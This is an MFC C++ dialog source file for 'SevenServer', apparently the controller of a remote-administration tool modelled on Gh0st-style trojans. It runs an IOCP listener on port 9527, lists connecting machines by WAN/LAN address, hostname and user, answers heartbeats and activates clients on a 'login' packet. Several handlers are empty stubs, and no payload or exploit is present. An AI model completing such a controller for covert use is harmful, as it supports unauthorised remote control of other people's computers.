
// SevenServerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "SevenServer.h"
#include "SevenServerDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
typedef struct
{
	CString	title;
	double		nWidth;
}COLUMNSTRUCT;
COLUMNSTRUCT m_Column_Data[] = 
{
	{_T("Wan"),					0.2		},
	{_T("Lan"),					0.2		},
	{_T("Hostname"),			0.2		},
	{_T("User"),				0.1		},
	{_T("Version"),				0.2		},
	{_T("Comment"),				0.09	},
};
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CSevenServerDlg 对话框




CSevenServerDlg::CSevenServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CSevenServerDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CSevenServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CLIENT_LISTCTRL, m_listCtrl);
}

BEGIN_MESSAGE_MAP(CSevenServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_CONTEXTMENU()
END_MESSAGE_MAP()


// CSevenServerDlg 消息处理程序

BOOL CSevenServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	m_Column_Count = 6;
	InitListCtrl();

	StartIOCPServer();

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CSevenServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CSevenServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CSevenServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CSevenServerDlg::InitListCtrl()
{
	DWORD dwStyle = m_listCtrl.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;//选中某行使整行高亮（只适用与report风格的listctrl）
	dwStyle |= LVS_EX_GRIDLINES;//网格线（只适用与report风格的listctrl）
	m_listCtrl.SetExtendedStyle(dwStyle); //设置扩展风格
	
	CRect rect;
	this->GetClientRect(&rect);
	int width = rect.Width();
	for (int i=0;i<m_Column_Count;i++)
	{
		m_listCtrl.InsertColumn(i,m_Column_Data[i].title,LVCFMT_LEFT,(int)(width*m_Column_Data[i].nWidth));
	}
}

void CSevenServerDlg::OnSize(UINT nType, int cx, int cy)
{
	//////////////////////////////////////////////////////////////////////////
	// move list ctrl
	//////////////////////////////////////////////////////////////////////////
	if (NULL == m_listCtrl)
	{
		return;
	}
	CDialogEx::OnSize(nType, cx, cy);
	CRect rect;
	this->GetClientRect(&rect);
	m_listCtrl.MoveWindow(rect);
	int width = rect.Width();
	for (int i=0;i<m_Column_Count;i++)
	{
		m_listCtrl.SetColumnWidth(i,(int)(width*m_Column_Data[i].nWidth));
	}
	// TODO: 在此处添加消息处理程序代码
}


void CSevenServerDlg::OnContextMenu(CWnd* /*pWnd*/, CPoint /*point*/)
{
	// TODO: 在此处添加消息处理程序代码
	if (m_listCtrl.GetSelectedCount() <= 0)
	{
		return;
	}
	//下面的这段代码, 不单单适应于ListCtrl
	CMenu menu, *pPopup;
	menu.LoadMenu(IDR_LIST_MENU);
	pPopup = menu.GetSubMenu(0);
	CPoint myPoint;
	ClientToScreen(&myPoint);
	GetCursorPos(&myPoint); //鼠标位置
	pPopup->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON, myPoint.x, myPoint.y,this);
}
void CSevenServerDlg::StartIOCPServer()
{
	m_iocpServer = new CIOCPServer;
	m_iocpServer->Initialize(NotifyProc,this,10000,9527);
}
void CALLBACK CSevenServerDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)
{
	try
	{
		CSevenServerDlg* pThis = (CSevenServerDlg*) lpParam;
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			pThis->OnDisconnect(pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			pThis->ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			pThis->ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}
void CSevenServerDlg::ProcessReceive(ClientContext *pContext)
{
	return;
}
void CSevenServerDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case CLIENT_DLG:
			((ClientDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}
	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case BASE_TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	case BASE_TOKEN_LOGIN: // 上线包
		{
			if (m_iocpServer->m_nMaxConnections <= m_listCtrl.GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				AddToList(pContext);
			}
			// 激活
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}
	return;
}
void CSevenServerDlg::OnDisconnect(ClientContext* pContext)
{
	return;
}
void CSevenServerDlg::AddToList(ClientContext* pContext)
{
	return;
}
